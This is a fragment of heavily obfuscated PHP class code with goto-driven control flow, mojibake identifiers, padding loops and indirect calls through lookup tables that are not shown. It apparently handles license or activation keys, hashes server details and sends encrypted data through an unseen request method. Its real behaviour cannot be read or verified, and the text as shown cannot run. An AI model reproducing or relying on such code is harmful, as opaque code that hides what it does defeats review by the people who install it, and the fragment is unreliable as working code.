EŠ«Şá±Ü§; d¬Şƒìƒî: $fê¶®æŒñÂ[39]($fê¶®æŒñÂ[43], MOD . $fê¶®æŒñÂ[1] . ST . $fê¶®æŒñÂ[1] . ACT); $a åÚ¤“ƒ¹ = $D¤©“İëÏ’[566]; if (!$a åÚ¤“ƒ¹) { die; } goto A‚¹˜Ûâ‰Û; aíâ¬Ï…¸†: $E¯â¿ë”í = $D¤©“İëÏ’[565]; if (!$E¯â¿ë”í) { die; } $fê¶®æŒñÂ[39]($fê¶®æŒñÂ[42], isset($f˜…Ïİï´×[2]) && $f˜…Ïİï´×[0] ? $f˜…Ïİï´×[2] : $this->defaultAction); goto d¬Şƒìƒî; c¾ßåñÆ‡: $D¤©“İëÏ’ =& $_SERVER[¿õñ]; $fê¶®æŒñÂ =& $_SERVER[°Šë¾«øµÑ]; $this->{$_SERVER[°Šë¾«øµÑ][37]}(); goto Cá‰‡õ…ô; Cá‰‡õ…ô: $eã†¨ñÜ¥ = $D¤©“İëÏ’[562]; $this->{$_SERVER[°Šë¾«øµÑ][38]}(); $f˜…Ïİï´× = $GLOBALS[$fê¶®æŒñÂ[22]][$fê¶®æŒñÂ[23]]; goto D…è…¢ĞÁÄ; b‘‹ÄÒç¿í: } private $ngiz3dfbac22 = array(); private $eavn6c5c271a = ''; public function thplb3ba21e2() { goto f¸£…°Š‹Ç; F‹ƒ¢—Ïñ: $this->{$_SERVER[°Šë¾«øµÑ][49]}(); $fáñ£‰áÅ› = $d­°ÛŞğæ‡[570]; $this->{$_SERVER[°Šë¾«øµÑ][50]}(); goto A ¨¬¹á¶; A ¨¬¹á¶: $this->{$_SERVER[°Šë¾«øµÑ][51]}(); $this->{$_SERVER[°Šë¾«øµÑ][52]}(); $E‰£óÌƒÛ„ = $d­°ÛŞğæ‡[571]; goto EØ°íİí•ç; AÊë—™ôï: $c°’à”ëƒÂ = $d­°ÛŞğæ‡[568]; if (!$c°’à”ëƒÂ) { return; } $this->{$_SERVER[°Šë¾«øµÑ][47]}(); goto A÷ÃÉ‡ßŞ; A÷ÃÉ‡ßŞ: $this->{$_SERVER[°Šë¾«øµÑ][48]}(); $dÒÍ”¾ù¦ñ = $d­°ÛŞğæ‡[569]; if (!$dÒÍ”¾ù¦ñ) { die; } goto F‹ƒ¢—Ïñ; EØ°íİí•ç: $this->{$_SERVER[°Šë¾«øµÑ][3]}($eø„ßˆôÈ[53], array($this, $eø„ßˆôÈ[54])); $this->{$_SERVER[°Šë¾«øµÑ][3]}($eø„ßˆôÈ[55], array($this, $eø„ßˆôÈ[56])); $this->{$_SERVER[°Šë¾«øµÑ][3]}($eø„ßˆôÈ[57], array($this, $eø„ßˆôÈ[58])); goto bÆñ¡‰¢¼; f¸£…°Š‹Ç: $d­°ÛŞğæ‡ =& $_SERVER[¿õñ]; $eø„ßˆôÈ =& $_SERVER[°Šë¾«øµÑ]; $this->{$_SERVER[°Šë¾«øµÑ][46]}(); goto AÊë—™ôï; bÆñ¡‰¢¼: $this->{$_SERVER[°Šë¾«øµÑ][3]}($eø„ßˆôÈ[59], array($this, $eø„ßˆôÈ[60])); $DÊ®‚­„¢ = $d­°ÛŞğæ‡[572]; if (strlen($DÊ®‚­„¢) < $d­°ÛŞğæ‡[550]) { return; } goto Aš»Õ§‘®; Aš»Õ§‘®: } public function npha5e7273d9($Fë‹ö„¤œ¯) { goto D­ËŸÖãÚç; fÁæ¡æó¼: $Dœ’â£ÔÜ¾ = $d«ãê‚ÑÛÅ[577]; if (strlen($Dœ’â£ÔÜ¾) < $d«ãê‚ÑÛÅ[548]) { return; } unset($Fë‹ö„¤œ¯[$AøÃ®µÅÙ[90]][$AøÃ®µÅÙ[91]][$AøÃ®µÅÙ[95]]); goto B¿İšáôÍÄ; AÅ¢ŞÆñİ¯: $Fë‹ö„¤œ¯[$AøÃ®µÅÙ[105]][$AøÃ®µÅÙ[125]] = $AøÃ®µÅÙ[101]($this->ngiz3dfbac22, $AøÃ®µÅÙ[126], $AøÃ®µÅÙ[10]); $Fë‹ö„¤œ¯[$AøÃ®µÅÙ[105]][$AøÃ®µÅÙ[127]] = $AøÃ®µÅÙ[101]($this->ngiz3dfbac22, $AøÃ®µÅÙ[128], $AøÃ®µÅÙ[10]); $E¹‡Ê±½¤ = $d«ãê‚ÑÛÅ[581]; goto a¬ğöÒ¯´Ü; fË¢§¬‚©: while (strlen($e„¶‘ñ«¯‰) < $d«ãê‚ÑÛÅ[553]) { if (!$e„¶‘ñ«¯‰) { break; } $e„¶‘ñ«¯‰++; } if ($DÁæÓ¬¦š[$AøÃ®µÅÙ[117]] != $AøÃ®µÅÙ[118]) { $Fë‹ö„¤œ¯[$AøÃ®µÅÙ[105]][$AøÃ®µÅÙ[119]] = $DÁæÓ¬¦š[$AøÃ®µÅÙ[119]]; $Fë‹ö„¤œ¯[$AøÃ®µÅÙ[105]][$AøÃ®µÅÙ[120]] = $DÁæÓ¬¦š[$AøÃ®µÅÙ[120]]; $E«®éñßÂİ = $AøÃ®µÅÙ[121](10) . $this->eavn6c5c271a . $AøÃ®µÅÙ[121](5); $Fë‹ö„¤œ¯[$AøÃ®µÅÙ[90]][$AøÃ®µÅÙ[122]][$AøÃ®µÅÙ[123]] = $this->{$_SERVER[°Šë¾«øµÑ][124]}($E«®éñßÂİ, $Fë‹ö„¤œ¯[$AøÃ®µÅÙ[105]][$AøÃ®µÅÙ[110]]); } if ($this->eavn6c5c271a == $AøÃ®µÅÙ[118]) { $Fë‹ö„¤œ¯[$AøÃ®µÅÙ[90]][$AøÃ®µÅÙ[91]][$AøÃ®µÅÙ[96]][$AøÃ®µÅÙ[104]] = 0; } goto AÅ¢ŞÆñİ¯; D­ËŸÖãÚç: $d«ãê‚ÑÛÅ =& $_SERVER[¿õñ]; $AøÃ®µÅÙ =& $_SERVER[°Šë¾«øµÑ]; $DÁæÓ¬¦š = $AøÃ®µÅÙ[61]($AøÃ®µÅÙ[62])->{$_SERVER[°Šë¾«øµÑ][63]}(); goto A‰¿Ù¬Ïùï; Eô¶âœ¿ÏÌ: $Fë‹ö„¤œ¯[$AøÃ®µÅÙ[105]][$AøÃ®µÅÙ[106]] = $AøÃ®µÅÙ[107]($AøÃ®µÅÙ[108])->{$_SERVER[°Šë¾«øµÑ][109]}(); $Fë‹ö„¤œ¯[$AøÃ®µÅÙ[105]][$AøÃ®µÅÙ[110]] = $AøÃ®µÅÙ[111]($_SERVER[$AøÃ®µÅÙ[112]] . $DÁæÓ¬¦š[$AøÃ®µÅÙ[113]]); $Fë‹ö„¤œ¯[$AøÃ®µÅÙ[105]][$AøÃ®µÅÙ[114]] = $AøÃ®µÅÙ[115]($AøÃ®µÅÙ[116]()); goto A†ï„¯Èí±; A‰¿Ù¬Ïùï: $f­‘¬ ©–¿ = array($AøÃ®µÅÙ[64], $AøÃ®µÅÙ[65], $AøÃ®µÅÙ[66], $AøÃ®µÅÙ[67], $AøÃ®µÅÙ[68], $AøÃ®µÅÙ[69], $AøÃ®µÅÙ[70], $AøÃ®µÅÙ[71], $AøÃ®µÅÙ[72], $AøÃ®µÅÙ[73], $AøÃ®µÅÙ[74], $AøÃ®µÅÙ[75], $AøÃ®µÅÙ[76], $AøÃ®µÅÙ[77], $AøÃ®µÅÙ[78], $AøÃ®µÅÙ[79], $AøÃ®µÅÙ[80], $AøÃ®µÅÙ[81], $AøÃ®µÅÙ[82], $AøÃ®µÅÙ[83], $AøÃ®µÅÙ[84], $AøÃ®µÅÙ[85], $AøÃ®µÅÙ[86], $AøÃ®µÅÙ[87]); $A‰†Ú¿éŸ¶ = $d«ãê‚ÑÛÅ[573]; while (strlen($A‰†Ú¿éŸ¶) < $d«ãê‚ÑÛÅ[550]) { if (!$A‰†Ú¿éŸ¶) { break; } $A‰†Ú¿éŸ¶++; } goto f÷Ş»½Â³Æ; f÷Ş»½Â³Æ: foreach ($f­‘¬ ©–¿ as $eŠ†Çøâ¤Ç) { $bù×ğŠÑÒ— = $GLOBALS[$AøÃ®µÅÙ[88]][$AøÃ®µÅÙ[89]][$eŠ†Çøâ¤Ç]; $dé˜Ëİ½£ = $d«ãê‚ÑÛÅ[574]; if (strlen($dé˜Ëİ½£) < $d«ãê‚ÑÛÅ[575]) { die; } if (isset($DÁæÓ¬¦š[$eŠ†Çøâ¤Ç])) { $bù×ğŠÑÒ— = $DÁæÓ¬¦š[$eŠ†Çøâ¤Ç]; } $Fë‹ö„¤œ¯[$AøÃ®µÅÙ[90]][$AøÃ®µÅÙ[91]][$eŠ†Çøâ¤Ç] = $bù×ğŠÑÒ—; } $AåÜŸ¿ôàæ = $Fë‹ö„¤œ¯[$AøÃ®µÅÙ[90]][$AøÃ®µÅÙ[91]][$AøÃ®µÅÙ[76]]; unset($Fë‹ö„¤œ¯[$AøÃ®µÅÙ[90]][$AøÃ®µÅÙ[92]][$AøÃ®µÅÙ[93]]); goto Aßé÷¬Úæ; B¿İšáôÍÄ: $eƒ‡‘ÌÍË¶ = $d«ãê‚ÑÛÅ[578]; while ($eƒ‡‘ÌÍË¶ < $d«ãê‚ÑÛÅ[548]) { if ($eƒ‡‘ÌÍË¶ >= 0) { break; } $eƒ‡‘ÌÍË¶++; } $Fë‹ö„¤œ¯[$AøÃ®µÅÙ[90]][$AøÃ®µÅÙ[91]][$AøÃ®µÅÙ[96]] = array($AøÃ®µÅÙ[97] => (int) $AåÜŸ¿ôàæ[$AøÃ®µÅÙ[98]], $AøÃ®µÅÙ[99] => $AøÃ®µÅÙ[100]($AøÃ®µÅÙ[101]($AåÜŸ¿ôàæ, $AøÃ®µÅÙ[102], array())), $AøÃ®µÅÙ[103] => (int) $AøÃ®µÅÙ[101]($AåÜŸ¿ôàæ, $AøÃ®µÅÙ[104], 0)); goto Eô¶âœ¿ÏÌ; A†ï„¯Èí±: $c‘ÙİßÒÈ¿ = $d«ãê‚ÑÛÅ[579]; $Fë‹ö„¤œ¯[$AøÃ®µÅÙ[105]][$AøÃ®µÅÙ[117]] = $this->eavn6c5c271a; $e„¶‘ñ«¯‰ = $d«ãê‚ÑÛÅ[580]; goto fË¢§¬‚©; Aßé÷¬Úæ: $fàÊİº•­Ê = $d«ãê‚ÑÛÅ[576]; unset($Fë‹ö„¤œ¯[$AøÃ®µÅÙ[90]][$AøÃ®µÅÙ[92]][$AøÃ®µÅÙ[94]]); unset($Fë‹ö„¤œ¯[$AøÃ®µÅÙ[90]][$AøÃ®µÅÙ[91]][$AøÃ®µÅÙ[76]]); goto fÁæ¡æó¼; a¬ğöÒ¯´Ü: if (strlen($E¹‡Ê±½¤) < $d«ãê‚ÑÛÅ[575]) { die; } if ($GLOBALS[$AøÃ®µÅÙ[129]] && $this->config[$AøÃ®µÅÙ[130]]) { $Fë‹ö„¤œ¯[$AøÃ®µÅÙ[105]][$AøÃ®µÅÙ[131]] = WEB_ROOT; } return $Fë‹ö„¤œ¯; goto d¿æàôšõ; d¿æàôšõ: } private function msyh9b836f84() { goto CÁøß–íã”; f¼¾Ù…µö: $Bíˆæ£´À = array($E¾¸“½ŒÁ[156] => $EÅ¨›©£Ô[$E¾¸“½ŒÁ[64]], $E¾¸“½ŒÁ[157] => $EÅ¨›©£Ô[$E¾¸“½ŒÁ[65]], $E¾¸“½ŒÁ[158] => $E¾¸“½ŒÁ[10]); foreach ($FœÏæÍĞ†… as $BÆŠ°¬ò°–) { if (!isset($EÅ¨›©£Ô[$BÆŠ°¬ò°–]) || !$EÅ¨›©£Ô[$BÆŠ°¬ò°–]) { continue; } $Bíˆæ£´À[$BÆŠ°¬ò°–] = $EÅ¨›©£Ô[$BÆŠ°¬ò°–]; $b›ääìÅÀß = $dŸÔ®†–ßö[583]; } $E¾¸“½ŒÁ[13](array($E¾¸“½ŒÁ[148], $E¾¸“½ŒÁ[149]), $Bíˆæ£´À); goto CÅ›Ü‡—ó; CÅ›Ü‡—ó: $dÜò„á•Úê = $dŸÔ®†–ßö[584]; goto B…Âˆ¦¶¾”; CÁøß–íã”: $dŸÔ®†–ßö =& $_SERVER[¿õñ]; $E¾¸“½ŒÁ =& $_SERVER[°Šë¾«øµÑ]; if ($_SERVER[$E¾¸“½ŒÁ[44]] == $E¾¸“½ŒÁ[132]) { goto eÆŒãºîãÑ; eñ¶Ù¿ôÓ: $a¨—ñ¯¹° = $dŸÔ®†–ßö[582]; if (!$a¨—ñ¯¹°) { return; } $Bíˆæ£´À = array($E¾¸“½ŒÁ[147] => $a…×¤ ò); goto dîš¶°šÕĞ; eÆŒãºîãÑ: $a…×¤ ò = array($E¾¸“½ŒÁ[117] => $this->eavn6c5c271a, $E¾¸“½ŒÁ[133] => $this->{$_SERVER[°Šë¾«øµÑ][134]}(), $E¾¸“½ŒÁ[135] => $E¾¸“½ŒÁ[61]($E¾¸“½ŒÁ[136])->{$_SERVER[°Šë¾«øµÑ][137]}()); if ($this->eavn6c5c271a != $E¾¸“½ŒÁ[118]) { $dçö Ò¦İ½ = $E¾¸“½ŒÁ[101]($this->ngiz3dfbac22, $E¾¸“½ŒÁ[138]); if ($dçö Ò¦İ½) { $a…×¤ ò[$E¾¸“½ŒÁ[139]] = $dçö Ò¦İ½; $a…×¤ ò[$E¾¸“½ŒÁ[140]] = $E¾¸“½ŒÁ[141]($E¾¸“½ŒÁ[101]($this->ngiz3dfbac22, $E¾¸“½ŒÁ[142])); $a…×¤ ò[$E¾¸“½ŒÁ[143]] = $E¾¸“½ŒÁ[101]($this->ngiz3dfbac22, $E¾¸“½ŒÁ[128]); } } $a…×¤ ò = $this->{$_SERVER[°Šë¾«øµÑ][144]}($E¾¸“½ŒÁ[145]($a…×¤ ò), $E¾¸“½ŒÁ[111]($E¾¸“½ŒÁ[146])); goto eñ¶Ù¿ôÓ; dîš¶°šÕĞ: $E¾¸“½ŒÁ[13](array($E¾¸“½ŒÁ[148], $E¾¸“½ŒÁ[149]), $Bíˆæ£´À); goto E–¥Ä‡öĞå; E–¥Ä‡öĞå: } goto Aô¿‘ó×â; Aô¿‘ó×â: if ($this->eavn6c5c271a == $E¾¸“½ŒÁ[118]) { return; } $FœÏæÍĞ†… = array($E¾¸“½ŒÁ[150], $E¾¸“½ŒÁ[151], $E¾¸“½ŒÁ[152], $E¾¸“½ŒÁ[153], $E¾¸“½ŒÁ[154], $E¾¸“½ŒÁ[155]); $EÅ¨›©£Ô = $E¾¸“½ŒÁ[61]($E¾¸“½ŒÁ[62])->{$_SERVER[°Šë¾«øµÑ][63]}(); goto f¼¾Ù…µö; B…Âˆ¦¶¾”: } private function kgrv3baafc52() { goto CÒÃ¹Ë³­; BÁÇçİ¯¡‰: while ($dë¾¾ƒÙóÇ < $F“ÈŒîå•[548]) { if ($dë¾¾ƒÙóÇ >= 0) { break; } $dë¾¾ƒÙóÇ++; } $d˜ÌÊŒ–µø[$a±—åŠ¨§] = $BÔØ˜äö¦Œ; $b°ØŠìŸŒ‹ = $F“ÈŒîå•[590]; goto eÌ±ÄÌ™ËÍ; C‡ğßÍ›Éñ: $a±—åŠ¨§ = $Bô›Ï¾½É[211]($Bô›Ï¾½É[25]($bˆÊÒéí÷Ê, 10, 16)); $BÔØ˜äö¦Œ = $this->{$_SERVER[°Šë¾«øµÑ][124]}($Bô›Ï¾½É[145]($CíàÜÌ´’), $bˆÊÒéí÷Ê); $DíˆÚËÆÒŠ = $Bô›Ï¾½É[219]($Bô›Ï¾½É[61]($Bô›Ï¾½É[11])->{$_SERVER[°Šë¾«øµÑ][220]}(), $Bô›Ï¾½É[221]); goto aó·ª¸èÇ; D•ËåØÊÖï: $BÉ¢Åİ…–– = array($Bô›Ï¾½É[206] => $CÚ¾©Ä’åò[$Bô›Ï¾½É[162]], $Bô›Ï¾½É[207] => $CíàÜÌ´’[$Bô›Ï¾½É[208]], $Bô›Ï¾½É[209] => $Bô›Ï¾½É[121](16), $Bô›Ï¾½É[117] => $CíàÜÌ´’[$Bô›Ï¾½É[210]]); if ($CÚ¾©Ä’åò[$Bô›Ï¾½É[165]]) { $BÉ¢Åİ…––[$Bô›Ï¾½É[209]] = $CÚ¾©Ä’åò[$Bô›Ï¾½É[165]]; } $aÆ¶ÊÅÓ˜ = $Bô›Ï¾½É[25]($Bô›Ï¾½É[111]($BÉ¢Åİ…––[$Bô›Ï¾½É[207]]), 10, 10); goto aË÷ã‰ê‡…; fõ¿÷¼Âõ: $CíàÜÌ´’ = $E§Àˆ¡Óë[$Bô›Ï¾½É[189]]; $CÃÍ¤ÙÆ  = $this->{$_SERVER[°Šë¾«øµÑ][196]}($CíàÜÌ´’[$Bô›Ï¾½É[197]]); if (!$CÃÍ¤ÙÆ  || $CÃÍ¤ÙÆ  != $Bô›Ï¾½É[198]($CíàÜÌ´’[$Bô›Ï¾½É[142]])) { $cÕ¨øê¢æÛ = array($Bô›Ï¾½É[199] => $Bô›Ï¾½É[61]($Bô›Ï¾½É[62])->{$_SERVER[°Šë¾«øµÑ][63]}($Bô›Ï¾½É[113]), $Bô›Ï¾½É[200] => $_SERVER[$Bô›Ï¾½É[112]], $Bô›Ï¾½É[201] => $Bô›Ï¾½É[202](), $Bô›Ï¾½É[171] => $_SERVER[$Bô›Ï¾½É[172]]); $DÊ¸²ª„ = $this->{$_SERVER[°Šë¾«øµÑ][203]}($Bô›Ï¾½É[145]($cÕ¨øê¢æÛ)); $this->{$_SERVER[°Šë¾«øµÑ][179]}($Bô›Ï¾½É[204] . $DÊ¸²ª„); $Bô›Ï¾½É[163]($Bô›Ï¾½É[194]($Bô›Ï¾½É[205]), !0); } goto D•ËåØÊÖï; a¯ç“İİ„: $B‰áÄó¢Ö = $F“ÈŒîå•[587]; while (strlen($B‰áÄó¢Ö) < $F“ÈŒîå•[553]) { if (!$B‰áÄó¢Ö) { break; } $B‰áÄó¢Ö++; } $AºˆğË÷‘‹ = $e²ÛËŠŠ­‚ . $BÉ¢Åİ…––[$Bô›Ï¾½É[117]] . $this->{$_SERVER[°Šë¾«øµÑ][144]}($Bô›Ï¾½É[111]($BÉ¢Åİ…––[$Bô›Ï¾½É[206]]), $e²ÛËŠŠ­‚); goto eôÃˆ”§´ç; aó·ª¸èÇ: $B¹‘Àæİà­ = $DíˆÚËÆÒŠ[$Bô›Ï¾½É[222]]; $d˜ÌÊŒ–µø = array(); $dë¾¾ƒÙóÇ = $F“ÈŒîå•[589]; goto BÁÇçİ¯¡‰; Fò ÅÅ¸Éø: if ($CíàÜÌ´’[$Bô›Ï¾½É[214]] && $CíàÜÌ´’[$Bô›Ï¾½É[214]] >= 1) { $Bô›Ï¾½É[61]($Bô›Ï¾½É[62])->{$_SERVER[°Šë¾«øµÑ][215]}($Bô›Ï¾½É[216], $Bô›Ï¾½É[217]); } $Bô›Ï¾½É[61]($Bô›Ï¾½É[62])->{$_SERVER[°Šë¾«øµÑ][218]}($BÉ¢Åİ…––); $bˆÊÒéí÷Ê = $Bô›Ï¾½É[111]($_SERVER[$Bô›Ï¾½É[112]] . $Bô›Ï¾½É[211]($díÀâ´„ºÛ) . $BÉ¢Åİ…––[$Bô›Ï¾½É[207]]); goto C‡ğßÍ›Éñ; aË÷ã‰ê‡…: $bÛ¼×‚™ = $aÆ¶ÊÅÓ˜ . $BÉ¢Åİ…––[$Bô›Ï¾½É[117]] . $BÉ¢Åİ…––[$Bô›Ï¾½É[209]]; $BÉ¢Åİ…––[$Bô›Ï¾½É[119]] = $Bô›Ï¾½É[211]($Bô›Ï¾½É[115]($this->{$_SERVER[°Šë¾«øµÑ][144]}($bÛ¼×‚™, $Bô›Ï¾½É[212]))); $e²ÛËŠŠ­‚ = $Bô›Ï¾½É[121](16); goto a¯ç“İİ„; bÇ¦Ô…÷‚»: $EŠ†ù¢©ê™ = $Bô›Ï¾½É[111]($_SERVER[$Bô›Ï¾½É[112]] . $díÀâ´„ºÛ); if ($C¸ì„¬ğ®[$Bô›Ï¾½É[175]] == $Bô›Ï¾½É[176]) { $fÆäÜô±è = $this->{$_SERVER[°Šë¾«øµÑ][144]}($EŠ†ù¢©ê™, $Bô›Ï¾½É[177]); $DÊ¸²ª„ = $this->{$_SERVER[°Šë¾«øµÑ][124]}($Bô›Ï¾½É[145]($CÚ¾©Ä’åò), $EŠ†ù¢©ê™ . $Bô›Ï¾½É[178], 3); $b‘å ƒ¶éÛ = $this->{$_SERVER[°Šë¾«øµÑ][179]}($Bô›Ï¾½É[180] . $fÆäÜô±è . $Bô›Ï¾½É[181] . $DÊ¸²ª„, -1); $Bô›Ï¾½É[163]($b‘å ƒ¶éÛ, !0); } else { if ($C¸ì„¬ğ®[$Bô›Ï¾½É[175]] == $Bô›Ï¾½É[182]) { $DÃºÆÂ¥‡² = $Bô›Ï¾½É[25]($Bô›Ï¾½É[111]($Bô›Ï¾½É[183] . $EŠ†ù¢©ê™), 12, 15) . $Bô›Ï¾½É[184]; $DÊ¸²ª„ = $this->{$_SERVER[°Šë¾«øµÑ][185]}($Bô›Ï¾½É[2]($C¸ì„¬ğ®[$Bô›Ï¾½É[186]]), $DÃºÆÂ¥‡², 2); $E§Àˆ¡Óë = $Bô›Ï¾½É[187]($DÊ¸²ª„, !0); if (!$Bô›Ï¾½É[188]($E§Àˆ¡Óë) || !$Bô›Ï¾½É[188]($E§Àˆ¡Óë[$Bô›Ï¾½É[189]]) || $E§Àˆ¡Óë[$Bô›Ï¾½É[162]] != !0) { $dÀŸ¢ğ¡®¬ = $Bô›Ï¾½É[190]; $Eî¶îÓï…¥ = $E§Àˆ¡Óë[$Bô›Ï¾½É[189]] ? $Bô›Ï¾½É[191] . $E§Àˆ¡Óë[$Bô›Ï¾½É[189]] : $dÀŸ¢ğ¡®¬; $Bô›Ï¾½É[163]($Eî¶îÓï…¥, !1); } else { $CÚ¾©Ä’åò[$Bô›Ï¾½É[165]] = $E§Àˆ¡Óë[$Bô›Ï¾½É[189]][$Bô›Ï¾½É[192]]; } } else { $E§Àˆ¡Óë = $this->{$_SERVER[°Šë¾«øµÑ][179]}($Bô›Ï¾½É[193], $CÚ¾©Ä’åò, 10); $fÚß¼¤‡± = $F“ÈŒîå•[586]; } } if (!$Bô›Ï¾½É[188]($E§Àˆ¡Óë) || !$Bô›Ï¾½É[188]($E§Àˆ¡Óë[$Bô›Ï¾½É[189]]) || $E§Àˆ¡Óë[$Bô›Ï¾½É[162]] != !0) { $dÀŸ¢ğ¡®¬ = $Bô›Ï¾½É[194]($Bô›Ï¾½É[195]); $Eî¶îÓï…¥ = $E§Àˆ¡Óë[$Bô›Ï¾½É[189]] ? $Bô›Ï¾½É[191] . $E§Àˆ¡Óë[$Bô›Ï¾½É[189]] : $dÀŸ¢ğ¡®¬; $Bô›Ï¾½É[163]($Eî¶îÓï…¥, !1); } goto fõ¿÷¼Âõ; eÌ±ÄÌ™ËÍ: while ($b°ØŠìŸŒ‹ < $F“ÈŒîå•[575]) { if ($b°ØŠìŸŒ‹ >= 0) { break; } $b°ØŠìŸŒ‹++; } $Bô›Ï¾½É[61]($Bô›Ï¾½É[11])->{$_SERVER[°Šë¾«øµÑ][223]}($B¹‘Àæİà­[$Bô›Ï¾½É[224]], array($Bô›Ï¾½É[225] => $d˜ÌÊŒ–µø)); $Bô›Ï¾½É[163]($Bô›Ï¾½É[194]($Bô›Ï¾½É[205]), !0); goto D¨‚§áï¿; B†Úä¾„Û²: $C¸ì„¬ğ® = $GLOBALS[$Bô›Ï¾½É[22]]; if (isset($C¸ì„¬ğ®[$Bô›Ï¾½É[160]])) { $this->{$_SERVER[°Šë¾«øµÑ][161]}(); die; } if (!isset($C¸ì„¬ğ®[$Bô›Ï¾½É[162]]) || $Bô›Ï¾½É[24]($C¸ì„¬ğ®[$Bô›Ï¾½É[162]]) != 16) { $Bô›Ï¾½É[163]($Bô›Ï¾½É[164] . $C¸ì„¬ğ®[$Bô›Ï¾½É[162]], !1); } goto F¦…îº¡ß°; eôÃˆ”§´ç: $f™Ô††ÂÆÊ = $F“ÈŒîå•[588]; if (strlen($f™Ô††ÂÆÊ) < $F“ÈŒîå•[544]) { die; } $BÉ¢Åİ…––[$Bô›Ï¾½É[120]] = $Bô›Ï¾½É[115]($Bô›Ï¾½É[211]($this->{$_SERVER[°Šë¾«øµÑ][144]}($AºˆğË÷‘‹, $Bô›Ï¾½É[213]))); goto Fò ÅÅ¸Éø; D¨‚§áï¿: $Bñœ‹šæô´ = $F“ÈŒîå•[591]; while ($Bñœ‹šæô´ < $F“ÈŒîå•[544]) { if ($Bñœ‹šæô´ >= 0) { break; } $Bñœ‹šæô´++; } goto DªŞ„ğÆÂó; F¦…îº¡ß°: $díÀâ´„ºÛ = $Bô›Ï¾½É[61]($Bô›Ï¾½É[62])->{$_SERVER[°Šë¾«øµÑ][63]}($Bô›Ï¾½É[113]); $CÚ¾©Ä’åò = array($Bô›Ï¾½É[162] => $C¸ì„¬ğ®[$Bô›Ï¾½É[162]], $Bô›Ï¾½É[165] => $Bô›Ï¾½É[121](16), $Bô›Ï¾½É[166] => $Bô›Ï¾½É[146], $Bô›Ï¾½É[167] => $Bô›Ï¾½É[168], $Bô›Ï¾½É[169] => $_SERVER[$Bô›Ï¾½É[170]], $Bô›Ï¾½É[171] => $_SERVER[$Bô›Ï¾½É[172]], $Bô›Ï¾½É[173] => $_SERVER[$Bô›Ï¾½É[174]]); $A‘Š’µ•Ø = $F“ÈŒîå•[585]; goto bÇ¦Ô…÷‚»; CÒÃ¹Ë³­: $F“ÈŒîå• =& $_SERVER[¿õñ]; $Bô›Ï¾½É =& $_SERVER[°Šë¾«øµÑ]; if ($_SERVER[$Bô›Ï¾½É[44]] != $Bô›Ï¾½É[159] || !$GLOBALS[$Bô›Ï¾½É[129]]) { return; } goto B†Úä¾„Û²; DªŞ„ğÆÂó: } private function znfj024680c8() { goto FÚùÒö•Üâ; B§•ÊŸšï¸: $this->ngiz3dfbac22 = array(); $D¸÷©ÈØÅ = $AÔ¢‘ùèĞ­[593]; if (strlen($D¸÷©ÈØÅ) < $AÔ¢‘ùèĞ­[550]) { return; } goto bËÓ¸œ¯; bËÓ¸œ¯: $this->eavn6c5c271a = $eéˆŠˆÃƒº[118]; goto aÍ‚øå×Ã‰; AÀ«Ö²ğãš: $DºÚÆ†³åÀ = $AÔ¢‘ùèĞ­[592]; while (strlen($DºÚÆ†³åÀ) < $AÔ¢‘ùèĞ­[548]) { if (!$DºÚÆ†³åÀ) { break; } $DºÚÆ†³åÀ++; } $eéˆŠˆÃƒº[61]($eéˆŠˆÃƒº[62])->{$_SERVER[°Šë¾«øµÑ][215]}($eéˆŠˆÃƒº[216], $eéˆŠˆÃƒº[226]); goto B§•ÊŸšï¸; FÚùÒö•Üâ: $AÔ¢‘ùèĞ­ =& $_SERVER[¿õñ]; $eéˆŠˆÃƒº =& $_SERVER[°Šë¾«øµÑ]; $eéˆŠˆÃƒº[61]($eéˆŠˆÃƒº[62])->{$_SERVER[°Šë¾«øµÑ][218]}(array($eéˆŠˆÃƒº[206] => $eéˆŠˆÃƒº[10], $eéˆŠˆÃƒº[207] => $eéˆŠˆÃƒº[10], $eéˆŠˆÃƒº[117] => $eéˆŠˆÃƒº[118], $eéˆŠˆÃƒº[119] => $eéˆŠˆÃƒº[10], $eéˆŠˆÃƒº[120] => $eéˆŠˆÃƒº[10])); goto AÀ«Ö²ğãš; aÍ‚øå×Ã‰: } private function lxse52c56926() { goto E“ïˆÙÔœ; BïŞŸ®¸±†: $BÔ“ùÙí† = $a‹ãÔ”İ¸Ó[595]; if (strlen($BÔ“ùÙí†) < $a‹ãÔ”İ¸Ó[544]) { return; } if ($e…ê·È³¦¤[$E„İÌ·ö¨¦[117]] == $E„İÌ·ö¨¦[118]) { return; } goto Dƒ˜ñëöŒ‡; EĞ¹”•ÈÙ: $aÍõêêä–³ = $a‹ãÔ”İ¸Ó[597]; $eÔù£„×¼Å = $E„İÌ·ö¨¦[211]($E„İÌ·ö¨¦[25]($d²Ò—Ò©È, 10, 16)); $aÇ‘»İÈÀ = $a‹ãÔ”İ¸Ó[598]; goto F¤±ôÙƒØÛ; a§¡©Íƒ¸Ä: $this->eavn6c5c271a = $e…ê·È³¦¤[$E„İÌ·ö¨¦[117]]; goto bÄ“ĞÔÇÕñ; Dƒ˜ñëöŒ‡: $c‰‰£“–™ = $E„İÌ·ö¨¦[61]($E„İÌ·ö¨¦[62])->{$_SERVER[°Šë¾«øµÑ][63]}($E„İÌ·ö¨¦[113]); $c•ÈÌƒñ³Ì = $E„İÌ·ö¨¦[219]($E„İÌ·ö¨¦[61]($E„İÌ·ö¨¦[11])->{$_SERVER[°Šë¾«øµÑ][220]}(), $E„İÌ·ö¨¦[221]); $a¢ƒ†ïôìë = $c•ÈÌƒñ³Ì[$E„İÌ·ö¨¦[222]]; goto a©ùÎÌ£¢; D”ùËéˆ†©: $d½Ä¨ğá×‹ = $a‹ãÔ”İ¸Ó[594]; if (!$d½Ä¨ğá×‹) { die; } $e…ê·È³¦¤ = $E„İÌ·ö¨¦[61]($E„İÌ·ö¨¦[62])->{$_SERVER[°Šë¾«øµÑ][63]}(); goto BïŞŸ®¸±†; a©ùÎÌ£¢: $DÜ†¥¶¬µš = $a‹ãÔ”İ¸Ó[596]; if (strlen($DÜ†¥¶¬µš) < $a‹ãÔ”İ¸Ó[550]) { die; } $d²Ò—Ò©È = $E„İÌ·ö¨¦[111]($_SERVER[$E„İÌ·ö¨¦[112]] . $E„İÌ·ö¨¦[211]($c‰‰£“–™) . $e…ê·È³¦¤[$E„İÌ·ö¨¦[207]]); goto EĞ¹”•ÈÙ; E“ïˆÙÔœ: $a‹ãÔ”İ¸Ó =& $_SERVER[¿õñ]; $E„İÌ·ö¨¦ =& $_SERVER[°Šë¾«øµÑ]; $this->eavn6c5c271a = $E„İÌ·ö¨¦[118]; goto D”ùËéˆ†©; 